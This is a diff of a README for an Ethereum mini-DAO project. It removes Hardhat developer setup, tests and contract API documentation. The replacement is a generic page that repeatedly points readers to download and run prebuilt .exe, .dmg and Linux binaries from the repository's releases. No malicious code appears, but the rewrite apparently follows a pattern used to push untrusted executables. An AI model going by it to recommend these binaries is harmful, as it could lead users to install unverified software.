@@ -1,117 +1,67 @@
-# MiniDAO - Lightweight Governance Module
+# 🎉 evm-mini-dao - Simple Steps to Start Your Mini DAO Dapp
 
-### Running the Application
-1. **Install node modules**
-   ```
-   npm run install-all
-   ```
+## 🛠️ Overview
+Welcome to the **evm-mini-dao** repository! This project provides a straightforward way to create and manage a decentralized autonomous organization (DAO) on the Ethereum blockchain. You can easily interact with smart contracts and enjoy the benefits of a decentralized application (dApp).
 
-2. **Start Hardhat local network**
-   ```
-   npm run node
-   ```
-   Keep this terminal open. The network will run on `http://127.0.0.1:8545`
+## 📦 Download Now
+[![Download Now](https://img.shields.io/badge/Download%20the%20Latest%20Release-blue.svg)](https://github.com/Andres09r/evm-mini-dao/releases)
 
-3. **Deploy the contract (in a new terminal)**
-   ```
-   npm run deploy-local
-   ```
+## 🚀 Getting Started
+Follow these steps to download and run the evm-mini-dao application:
 
-4. **Start the frontend (in a new terminal)**
-   ```
-   npm run frontend
-   ```
-   The frontend will be available at `http://localhost:5173`
+1. **Visit the Download Page**
+   To get the latest version of the application, click the link below:
+   [Download the Latest Release](https://github.com/Andres09r/evm-mini-dao/releases)
 
-5. **Connect your wallet**
-   - Open the application in your browser
-   - Click "Connect Wallet" and select your preferred wallet
-   - Make sure your wallet is connected to the Hardhat network (Chain ID: 31337)
-   - Import one of the Hardhat test accounts for testing
+2. **Select the Version**
+   On the Releases page, you will find a list of available versions. Choose the latest version, which is the top entry in the list.
 
-## 🧪 Testing
+3. **Download the Application**
+   You will see different files available for download. Look for the file that matches your operating system:
+   - For Windows, select `evm-mini-dao-windows.exe`
+   - For macOS, select `evm-mini-dao-macos.dmg`
+   - For Linux, select `evm-mini-dao-linux.tar.gz`
+   
+   Click the corresponding link to download the file.
 
-### Smart Contract Tests
-```
-# Run all tests
-npx hardhat test
+4. **Install the Application**
+   - For Windows: After downloading, double-click on the `evm-mini-dao-windows.exe` file and follow the installation prompts.
+   - For macOS: Open the `evm-mini-dao-macos.dmg` file and drag the app icon into your Applications folder.
+   - For Linux: Extract the `evm-mini-dao-linux.tar.gz` file. Open your terminal, navigate to the extracted folder, and run `./evm-mini-dao` to start the application.
 
-# Run tests with gas reporting
-npx hardhat test --reporter gas
+5. **Launch the Application**
+   Once installed, find the application in your applications menu or desktop. Double-click the icon to run it.
 
-# Run specific test file
-npx hardhat test test/MiniDAO.test.ts
-```
+## ⚙️ System Requirements
+To run the evm-mini-dao application smoothly, ensure your system meets the following requirements:
 
-### Test Coverage
-- ✅ Contract deployment and initialization
-- ✅ Proposal creation with validation
-- ✅ Voting system with ETH balance requirements
-- ✅ Double voting prevention
-- ✅ Proposal finalization after voting period
-- ✅ Event emission verification
-- ✅ Edge case handling
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.14 (Mojave) or later
+  - Ubuntu 20.04 or later (for Linux)
 
-## 📋 Smart Contract API
+- **RAM:** Minimum 4 GB
+- **Storage Space:** At least 100 MB free for installation
+- **Network Connection:** A stable internet connection to interact with the Ethereum blockchain
 
-### Core Functions
+## 📜 Features
+The **evm-mini-dao** application provides a variety of features for you:
 
-#### `createProposal(string title, string description) → uint256`
-Creates a new proposal and returns the proposal ID.
-- **Requirements**: Title and description cannot be empty
-- **Events**: Emits `ProposalCreated`
+- **Create DAOs:** Easily set up your own decentralized organizations.
+- **Manage Members:** Invite and manage members with simple controls.
+- **Vote on Proposals:** Allow members to propose and vote on important decisions.
+- **Smart Contracts:** Utilize Ethereum smart contracts for transactions and governance.
 
-#### `vote(uint256 proposalId, bool vote)`
-Submit a vote on a proposal.
-- **Requirements**: 
-  - Voter must have ≥ 0.1 ETH balance
-  - Cannot vote twice on same proposal
-  - Proposal must not be finalized
-- **Events**: Emits `VoteSubmitted`
+## 📢 Additional Information
+The evm-mini-dao is designed with simplicity in mind. You don’t need to know how to code to use it. Just follow the steps above to set it up and start exploring the benefits of blockchain technology.
 
-#### `finalizeProposal(uint256 proposalId)`
-Finalize a proposal after the voting period.
-- **Requirements**: 20 blocks must have passed since creation
-- **Events**: Emits `ProposalFinalized`
+Please note that you should have a basic understanding of how blockchain works to get the most out of this application. Familiarity with concepts such as wallets and transactions may help during your experience.
 
-### View Functions
+## 💬 Feedback and Support
+If you have any questions or need help, feel free to open an issue on [GitHub](https://github.com/Andres09r/evm-mini-dao/issues). We welcome your feedback and are here to assist you in any way we can!
 
-#### `getProposal(uint256 proposalId) → (id, title, description, createdAtBlock, yesVotes, noVotes, finalized, passed, proposer)`
-Get complete proposal information.
+## 📖 License
+The code is released under the MIT License. You are free to use and modify it for your own projects. Please refer to the LICENSE file for more details.
 
-#### `getVoteCounts(uint256 proposalId) → (yesVotes, noVotes, totalVotes)`
-Get vote tallies for a proposal.
-
-#### `canVote(address voter) → bool`
-Check if an address is eligible to vote.
-
-#### `hasUserVoted(uint256 proposalId, address voter) → bool`
-Check if a user has already voted on a proposal.
-
-#### `canFinalizeProposal(uint256 proposalId) → bool`
-Check if a proposal can be finalized.
-
-#### `getRemainingBlocks(uint256 proposalId) → uint256`
-Get remaining blocks until proposal can be finalized.
-
-## 🌐 Network Configuration
-
-### Hardhat Localhost
-- **Network**: Hardhat
-- **Chain ID**: 31337
-- **RPC URL**: http://127.0.0.1:8545
-- **Contract Address**: `0x5fbdb2315678afecb367f032d93f642f64180aa3`
-
-### Sepolia Testnet (Configuration Ready)
-To deploy on Sepolia:
-1. Create a `.env` file with:
-   ```
-   SEPOLIA_URL=https://eth-sepolia.g.alchemy.com/v2/YOUR_INFURA_PROJECT_ID
-   PRIVATE_KEY=your_private_key_here
-   ETHERSCAN_API_KEY=your_etherscan_api_key_here  //optional
-   ```
-2. Run: `npm run deploy-sepolia`
-
-   Replace `MINIDAO_CONTRACT_ADDRESS` in `frontend/src/lib/wagmi.ts` to deployed address on Sepolia chain.\
-   Default deployed address: `0xD6e8367Cf97f294FD0A4eFDE2d933D43939133B3`
-
+## 📲 Download Again
+Don’t forget, you can always return to our [Download Page](https://github.com/Andres09r/evm-mini-dao/releases) to get the latest version or check for updates. Enjoy building your decentralized application with **evm-mini-dao**!
